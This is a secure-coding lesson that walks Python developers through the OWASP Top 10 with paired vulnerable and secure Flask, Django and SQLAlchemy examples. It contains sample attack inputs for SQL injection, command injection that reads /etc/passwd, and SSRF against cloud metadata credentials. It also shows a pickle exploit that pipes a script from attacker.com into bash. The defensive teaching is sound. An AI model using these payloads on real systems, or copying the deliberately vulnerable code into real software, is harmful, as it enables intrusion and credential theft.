OWASP Top 10 Overview for Python Developers

Intuition

Think of the OWASP Top 10 as a building inspector's checklist for a house. Just as an inspector checks the foundation (access control), the locks (authentication), the wiring (injection prevention), and the fire exits (logging and monitoring), the OWASP Top 10 systematically covers the most critical structural weaknesses in web applications. You would never move into a house that failed inspection — and you should never deploy an application that fails these checks.

OWASP Top 10 Overview for Python Developers

The Open Web Application Security Project (OWASP) Top 10 is the most widely recognized catalog of web application security risks. Updated periodically based on real-world vulnerability data, the 2021 edition represents the consensus of hundreds of security experts analyzing thousands of applications. As a Python backend developer, understanding these risks is not optional — it is foundational to building software that protects your users, your organization, and yourself.

This lesson walks through all ten categories with Python-specific code examples, explains how real breaches exploited these weaknesses, and provides concrete defense patterns you can adopt immediately.

A01:2021 — Broken Access Control

Broken access control moved from fifth place to the number one spot in the 2021 edition. It occurs when users can act outside their intended permissions — viewing another user's data, escalating privileges, or modifying resources they should not touch.

Python Example: Insecure Direct Object Reference (IDOR)

# VULNERABLE: No authorization check — any authenticated user
# can view any other user's profile by changing the ID.
@app.route('/api/users/<int:user_id>/profile')
@login_required
def get_profile(user_id):
    profile = db.session.query(UserProfile).get(user_id)
    return jsonify(profile.to_dict())

The endpoint checks that the caller is logged in but never verifies that the caller is allowed to see this particular profile.

# SECURE: Verify the requesting user owns the resource or has admin role.
@app.route('/api/users/<int:user_id>/profile')
@login_required
def get_profile(user_id):
    if current_user.id != user_id and not current_user.is_admin:
        abort(403)
    profile = db.session.query(UserProfile).get(user_id)
    if profile is None:
        abort(404)
    return jsonify(profile.to_dict())

Real-world reference: In 2019, a major US financial institution exposed 106 million customer records because an SSRF vulnerability combined with overly permissive IAM roles allowed an attacker to access S3 buckets. The root cause was broken access control at the cloud infrastructure layer.

Defense Patterns

  • Default-deny: require explicit grants for every resource.
  • Implement row-level authorization in your ORM queries.
  • Write integration tests that attempt cross-user access and assert 403 responses.
  • Log and alert on repeated 403s from a single session.

A02:2021 — Cryptographic Failures

Formerly called "Sensitive Data Exposure," this category focuses on failures related to cryptography — or the absence of it. Storing passwords in plaintext, using MD5 for hashing, transmitting data over HTTP, or hardcoding encryption keys all fall here.

Python Example: Weak Password Hashing

import hashlib

# VULNERABLE: MD5 is fast, unsalted, and trivially reversible via rainbow tables.
def hash_password(password: str) -> str:
    return hashlib.md5(password.encode()).hexdigest()

import bcrypt

# SECURE: bcrypt is intentionally slow, salted, and resistant to GPU attacks.
def hash_password(password: str) -> bytes:
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))

def verify_password(password: str, hashed: bytes) -> bool:
    return bcrypt.checkpw(password.encode('utf-8'), hashed)

Real-world reference: The 2012 LinkedIn breach exposed 6.5 million password hashes stored as unsalted SHA-1. Within hours, a significant fraction were cracked using off-the-shelf tools.

Defense Patterns

  • Use bcrypt, argon2-cffi, or scrypt for password hashing — never MD5, SHA-1, or SHA-256 alone.
  • Enforce TLS everywhere; use Strict-Transport-Security headers.
  • Store secrets in a vault (HashiCorp Vault, AWS Secrets Manager), not in code or environment variables on disk.
  • Rotate encryption keys on a schedule and support key versioning.

A03:2021 — Injection

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. SQL injection remains the most common, but OS command injection, LDAP injection, and ORM injection are all relevant in Python backends.

Python Example: SQL Injection

# VULNERABLE: String interpolation places user input directly into SQL.
def get_user(username: str):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.engine.execute(query).fetchone()

# An attacker sends: username = "' OR '1'='1' --"
# The resulting query returns ALL users.

from sqlalchemy import text

# SECURE: Parameterized query — the database driver handles escaping.
def get_user(username: str):
    query = text("SELECT * FROM users WHERE username = :username")
    return db.engine.execute(query, username=username).fetchone()

OS Command Injection

import subprocess

# VULNERABLE: Shell=True with user-controlled input.
def ping_host(host: str):
    result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)
    return result.stdout.decode()

# Attacker sends: host = "8.8.8.8; cat /etc/passwd"

import subprocess
import re

# SECURE: Avoid shell=True, pass arguments as a list, and validate input.
def ping_host(host: str):
    if not re.match(r'^[\d.]+$', host):
        raise ValueError("Invalid host")
    result = subprocess.run(["ping", "-c", "1", host], capture_output=True)
    return result.stdout.decode()

Real-world reference: The 2008 Heartland Payment Systems breach, one of the largest ever, was initiated through SQL injection, compromising 130 million credit card numbers.

A04:2021 — Insecure Design

Insecure design is a new category in 2021 that addresses flaws in the architecture itself — no amount of perfect implementation can fix a fundamentally insecure design. This includes missing rate limiting on authentication endpoints, not requiring re-authentication for sensitive operations, or designing a password reset flow that leaks information.

Python Example: Missing Rate Limiting

# INSECURE DESIGN: No rate limiting on login endpoint.
@app.route('/api/login', methods=['POST'])
def login():
    username = request.json['username']
    password = request.json['password']
    user = authenticate(username, password)
    if user:
        return jsonify(token=create_token(user))
    return jsonify(error="Invalid credentials"), 401

from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

# SECURE DESIGN: Rate limit brute-force attempts.
@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    username = request.json['username']
    password = request.json['password']
    user = authenticate(username, password)
    if user:
        return jsonify(token=create_token(user))
    # Return generic message — do not reveal whether username exists.
    return jsonify(error="Invalid credentials"), 401

Defense Patterns

  • Use threat modeling (STRIDE, PASTA) during the design phase.
  • Require re-authentication for state-changing operations on sensitive resources.
  • Design password reset flows that do not reveal whether an account exists.
  • Establish trust boundaries and validate data at every boundary crossing.

A05:2021 — Security Misconfiguration

This is the broadest category: debug mode in production, default credentials left in place, unnecessary features enabled, overly verbose error messages, missing security headers, or permissive CORS policies.

Python Example: Debug Mode in Production

# VULNERABLE: Flask debug mode exposes an interactive debugger
# that allows arbitrary code execution on the server.
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')

import os

# SECURE: Read configuration from environment, default to safe values.
if __name__ == '__main__':
    debug_mode = os.environ.get('FLASK_DEBUG', 'false').lower() == 'true'
    app.run(debug=debug_mode, host='0.0.0.0')

# In production, FLASK_DEBUG is never set to 'true'.
# Better yet, use a proper WSGI server like gunicorn.

Django Security Checklist

# settings.py — production hardening
DEBUG = False
ALLOWED_HOSTS = ['yourdomain.com']
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True

Always run python manage.py check --deploy before deploying a Django application — it catches many of these misconfigurations automatically.

A06:2021 — Vulnerable and Outdated Components

Python applications rely heavily on third-party packages from PyPI. A single vulnerable dependency — or a dependency of a dependency — can compromise your entire application.

Defense Patterns

# Use pip-audit to scan for known vulnerabilities in your dependencies.
pip install pip-audit
pip-audit

# Use Safety (another popular tool)
pip install safety
safety check

# Pin dependencies in requirements.txt with hashes for integrity.
pip freeze > requirements.txt
# Or better yet, use pip-compile from pip-tools:
pip-compile --generate-hashes requirements.in

# In your CI/CD pipeline (e.g., GitHub Actions):
# - name: Audit dependencies
#   run: |
#     pip install pip-audit
#     pip-audit --strict

Real-world reference: The 2021 Log4Shell vulnerability (CVE-2021-44228) demonstrated how a single library vulnerability can cascade across millions of applications. While Log4j is a Java library, the Python ecosystem has had comparable incidents — the event-stream style supply chain attacks and the ctx package typosquatting incident in 2022 on PyPI.

Key Practices

  • Maintain a Software Bill of Materials (SBOM).
  • Subscribe to security advisories for your critical dependencies.
  • Automate dependency updates with tools like Dependabot or Renovate.
  • Evaluate new dependencies for maintenance health before adopting them.

A07:2021 — Identification and Authentication Failures

This covers weak password policies, credential stuffing vulnerabilities, session fixation, improper session invalidation, and token mismanagement.

Python Example: Insecure JWT Handling

import jwt

# VULNERABLE: Using 'none' algorithm or not verifying the algorithm.
def decode_token(token: str) -> dict:
    # An attacker can forge a token with alg: 'none'
    return jwt.decode(token, options={"verify_signature": False})

import jwt

SECRET_KEY = "your-256-bit-secret"  # In practice, load from a vault.

# SECURE: Explicitly specify allowed algorithms and verify signature.
def decode_token(token: str) -> dict:
    return jwt.decode(
        token,
        SECRET_KEY,
        algorithms=["HS256"],  # Whitelist algorithms
        options={"require": ["exp", "iat", "sub"]}
    )

def create_token(user_id: int) -> str:
    payload = {
        "sub": user_id,
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(hours=1)
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

Defense Patterns

  • Enforce minimum password complexity and check against breached password lists (via the Have I Been Pwned API).
  • Implement multi-factor authentication for sensitive operations.
  • Invalidate sessions server-side on logout — do not rely solely on client-side token deletion.
  • Set short expiration times for JWTs and implement refresh token rotation.

A08:2021 — Software and Data Integrity Failures

This category covers assumptions about software updates, critical data, and CI/CD pipelines without verifying integrity. Deserialization of untrusted data is a classic example in Python.

Python Example: Insecure Deserialization with Pickle

import pickle

# VULNERABLE: pickle.loads executes arbitrary code during deserialization.
def load_user_session(data: bytes):
    return pickle.loads(data)  # NEVER do this with untrusted input.

# An attacker can craft a payload that executes: os.system('rm -rf /')
# by overriding __reduce__ in a serialized object.

import json
import hmac
import hashlib

SECRET = b'your-secret-key'

# SECURE: Use JSON for serialization and HMAC for integrity verification.
def save_session(data: dict) -> tuple:
    payload = json.dumps(data).encode()
    signature = hmac.new(SECRET, payload, hashlib.sha256).hexdigest()
    return payload, signature

def load_session(payload: bytes, signature: str) -> dict:
    expected = hmac.new(SECRET, payload, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected, signature):
        raise ValueError("Tampered session data")
    return json.loads(payload)

Critical rule: Never use pickle, marshal, or yaml.load() (use yaml.safe_load()) with untrusted input. This is one of the most dangerous patterns in Python.

CI/CD Integrity

  • Sign your commits and tags with GPG.
  • Verify checksums and signatures of downloaded artifacts.
  • Use lock files with hashes (pip-compile --generate-hashes).
  • Restrict who can modify CI/CD pipeline definitions.

A09:2021 — Security Logging and Monitoring Failures

If you cannot detect an attack, you cannot respond to it. Many breaches go undetected for months because applications lack adequate logging, or logs are not monitored.

Python Example: Comprehensive Security Logging

import logging
import structlog

# Configure structured logging for security events.
logger = structlog.get_logger("security")

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    username = request.json.get('username', '')
    user = authenticate(username, request.json.get('password', ''))

    if user:
        logger.info(
            "authentication_success",
            username=username,
            ip=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        return jsonify(token=create_token(user))

    # Log failed attempts — critical for detecting brute force.
    logger.warning(
        "authentication_failure",
        username=username,
        ip=request.remote_addr,
        user_agent=request.headers.get('User-Agent')
    )
    return jsonify(error="Invalid credentials"), 401

What to Log

  • Authentication successes and failures
  • Authorization failures (403 responses)
  • Input validation failures
  • Application errors and exceptions
  • Administrative actions (user creation, permission changes)

What NOT to Log

  • Passwords or tokens
  • Full credit card numbers or SSNs
  • Session identifiers (log a hash instead)

A10:2021 — Server-Side Request Forgery (SSRF)

SSRF occurs when an application fetches a remote resource based on user-supplied input without validating the destination. An attacker can make the server access internal services, cloud metadata endpoints, or other protected resources.

Python Example: SSRF Vulnerability

import requests

# VULNERABLE: The user controls the URL the server fetches.
@app.route('/api/fetch-url')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)
    return response.text

# Attacker sends: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# This fetches AWS instance credentials from the metadata service.

from urllib.parse import urlparse
import ipaddress
import socket

ALLOWED_SCHEMES = {'http', 'https'}
BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # Cloud metadata
    ipaddress.ip_network('127.0.0.0/8'),
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    try:
        # Resolve hostname to IP and check against blocked ranges.
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        return not any(ip in network for network in BLOCKED_NETWORKS)
    except (socket.gaierror, ValueError):
        return False

@app.route('/api/fetch-url')
def fetch_url():
    url = request.args.get('url')
    if not is_safe_url(url):
        abort(400, "URL not allowed")
    response = requests.get(url, timeout=5, allow_redirects=False)
    return response.text

Real-world reference: The 2019 Capital One breach was fundamentally an SSRF attack against the AWS metadata service, resulting in the exposure of 106 million customer records and a $190 million settlement.

Defense Patterns

  • Validate and sanitize all user-supplied URLs.
  • Use allowlists for permitted domains when possible.
  • Block access to internal IP ranges and cloud metadata endpoints.
  • Disable HTTP redirects or re-validate after each redirect.
  • Use network-level controls (firewall rules) as defense in depth.

Security is not a feature you bolt on at the end — it is a property of your entire development process. Every code review should include a security lens. Every design document should include a threat model. Every deployment pipeline should include automated security scanning.

The OWASP Top 10 is a starting point, not a finish line. Master these ten categories, and you will be equipped to reason about the vast majority of vulnerabilities you will encounter in Python backend development.

Exercises

  1. Harden a Vulnerable Flask Endpoint

    You are given a Flask endpoint that fetches a user's order history by order ID passed as a URL parameter. The endpoint is vulnerable to IDOR (Insecure Direct Object Reference) and SQL injection. Refactor the endpoint to: (1) use parameterized queries via SQLAlchemy, (2) verify that the authenticated user owns the requested order, and (3) return appropriate HTTP status codes for unauthorized and not-found cases. Write both the vulnerable and secure versions, and add a unit test that proves a user cannot access another user's orders.

    Hint

    Start by using SQLAlchemy's text() with named parameters for the query. Then add an authorization check that compares current_user.id against the order's user_id field. For the test, authenticate as user A and attempt to fetch an order belonging to user B — assert a 403 response.

  2. Build a Secure Deserialization Pipeline

    Create a Python module that receives serialized session data from a Redis cache. The current implementation uses pickle.loads(). Replace it with a JSON-based approach that includes HMAC integrity verification. Your module should provide serialize_session(data: dict) -> str and deserialize_session(token: str) -> dict functions. The token format should be base64(payload).base64(signature). Write tests that verify: (1) valid tokens deserialize correctly, (2) tampered tokens raise an exception, and (3) tokens with invalid signatures are rejected.

    Hint

    Use json.dumps() for serialization, hmac.new() with SHA-256 for signing, and base64.urlsafe_b64encode() for encoding. In deserialize_session, split on the dot separator, decode both parts, recompute the HMAC, and use hmac.compare_digest() for constant-time comparison.

  3. Implement an SSRF-Safe URL Fetcher

    Build a Python function safe_fetch(url: str) -> str that fetches a URL provided by the user while protecting against SSRF attacks. Your function must: (1) only allow HTTP and HTTPS schemes, (2) resolve the hostname and block private/internal IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x), (3) handle DNS rebinding by checking the resolved IP before making the request, (4) disable redirects or re-validate after each redirect, and (5) enforce a timeout. Write tests that verify blocked IPs, blocked schemes like file://, and a normal HTTPS fetch.

    Hint

    Use socket.gethostbyname() to resolve the hostname before passing it to requests.get(). Create a list of ipaddress.ip_network objects for blocked ranges and check with ip in network. Set allow_redirects=False in the requests call and handle redirects manually with re-validation.

  4. Security Logging Audit

    Review the following Django view code and identify all security logging deficiencies. Then refactor it to include proper structured logging using Python's structlog library. The view handles password changes and currently only logs a generic 'password changed' message. Your refactored version should log: the user ID, the IP address, the timestamp, whether the old password verification succeeded, and the outcome — all without logging any actual password values. Also add logging for rate-limit violations.

    Hint

    Use structlog.get_logger('security') and log separate events for: old password verification failure, password change success, and password change failure. Extract the IP from request.META.get('REMOTE_ADDR'). Never include old_password or new_password in log entries. Consider adding a event_type field to enable filtering in your log aggregation system.

Common Problems & Solutions

1 Application is vulnerable to SQL injection despite using an ORM
Symptoms: Security scanners flag SQL injection. Unusual database errors appear in logs with fragments of SQL syntax in user-supplied fields. Data exfiltration occurs without any visible application errors.
Cause: Developers sometimes bypass the ORM's built-in parameterization by using raw SQL queries with string formatting, `.extra()`, `.raw()`, or `RawSQL()` in Django, or `text()` without bound parameters in SQLAlchemy.
Solution: Audit all raw SQL usage in your codebase by searching for `.raw(`, `.extra(`, `RawSQL(`, and `db.engine.execute(` with string formatting. Replace all instances with parameterized queries. Add a linting rule (e.g., using `bandit` or a custom `flake8` plugin) that flags string concatenation or f-strings in SQL contexts. Run `bandit -r your_project/` as part of your CI pipeline.

Vulnerable Django ORM usage:

User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{username}'")

Secure alternative:

User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [username])

Vulnerable SQLAlchemy:

db.engine.execute(f"SELECT * FROM users WHERE name = '{name}'")

Secure alternative:

from sqlalchemy import text db.engine.execute(text("SELECT * FROM users WHERE name = :name"), name=name)

2 Pickle deserialization allows remote code execution
Symptoms: Unexpected system processes spawning, reverse shells opening, data being exfiltrated. In some cases, no symptoms at all until the attacker has established persistence.
Cause: Using `pickle.loads()` on data from untrusted sources (user input, Redis caches shared across trust boundaries, message queues, or uploaded files). Python's pickle protocol can execute arbitrary code during deserialization via the `__reduce__` method.
Solution: Replace `pickle` with `json` for all serialization of untrusted data. If you need to serialize complex Python objects, use a schema-based serializer like `marshmallow` or `pydantic` that explicitly defines allowed fields and types. For caching, serialize to JSON and deserialize with schema validation. If pickle is absolutely necessary for trusted internal use, sign the data with HMAC before storing and verify before loading. Search your codebase with `grep -rn 'pickle.loads\|pickle.load(' .` to find all instances.

Dangerous pattern often found in Flask session handling or caching:

import pickle data = redis_client.get(f'session:{session_id}') session = pickle.loads(data) # Arbitrary code execution risk

Attacker payload example:

import os class Exploit: def reduce(self): return (os.system, ('curl attacker.com/shell.sh | bash',))

3 JWT tokens accepted without proper algorithm verification
Symptoms: Users gaining admin privileges unexpectedly. Tokens that should be expired still being accepted. Authentication bypasses appearing in penetration test reports.
Cause: Using `jwt.decode()` without specifying the `algorithms` parameter, or setting `verify_signature` to False. This allows attackers to forge tokens by changing the algorithm to 'none' or switching from RS256 to HS256 (using the public key as the HMAC secret).
Solution: Always pass an explicit `algorithms` list to `jwt.decode()`. Never disable signature verification. If using asymmetric algorithms (RS256), ensure the key type matches the algorithm — do not accept HMAC algorithms when you expect RSA. Add token expiration checks (`exp` claim) and issuer validation (`iss` claim). Consider using a well-maintained wrapper library like `python-jose` or `authlib` that enforces safe defaults.

Vulnerable:

import jwt payload = jwt.decode(token, options={'verify_signature': False})

Also vulnerable — allows algorithm switching:

payload = jwt.decode(token, PUBLIC_KEY)

Secure:

payload = jwt.decode( token, SECRET_KEY, algorithms=['HS256'], options={'require': ['exp', 'iat', 'sub']} )
